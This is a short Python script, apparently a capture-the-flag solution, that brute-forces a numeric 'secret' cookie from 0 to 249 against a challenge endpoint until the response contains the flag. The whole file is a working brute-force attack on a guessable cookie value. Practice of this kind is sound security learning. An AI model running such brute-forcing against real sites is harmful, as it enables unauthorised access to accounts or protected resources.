#!/usr/bin/env python3
import requests

url = "http://cookies.acmcyber.com/flag"
# url = "http://localhost:9999/flag"

for i in range(250):
    cookies = {'secret': str(i)}
    r = requests.get(url, cookies=cookies)
    print("Cookie: ", i)
    if r.text.find("flag") != -1:
        print("Found it!")
        print(r.text)
        break